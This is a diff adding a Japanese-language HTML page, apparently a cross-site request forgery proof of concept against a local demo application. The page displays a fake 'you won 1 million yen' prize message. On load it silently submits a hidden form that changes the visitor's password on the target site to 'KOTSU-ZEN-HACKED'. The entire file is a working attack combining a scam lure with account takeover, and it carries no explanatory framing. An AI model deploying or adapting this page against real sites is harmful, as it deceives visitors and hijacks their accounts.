@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <title>おめでとうございます！</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <div style="text-align: center; margin-top: 50px">
+      <h1 style="color: red">🎊 100万円に当選しました！ 🎊</h1>
+      <p>
+        おめでとうございます！手続きのためにこのページを閉じないでください...
+      </p>
+    </div>
+
+    <form
+      action="http://localhost:8080/auth/change_password.php"
+      method="POST"
+      style="display: none"
+    >
+      <input type="hidden" name="new_password" value="KOTSU-ZEN-HACKED" />
+    </form>
+  </body>
+</html>
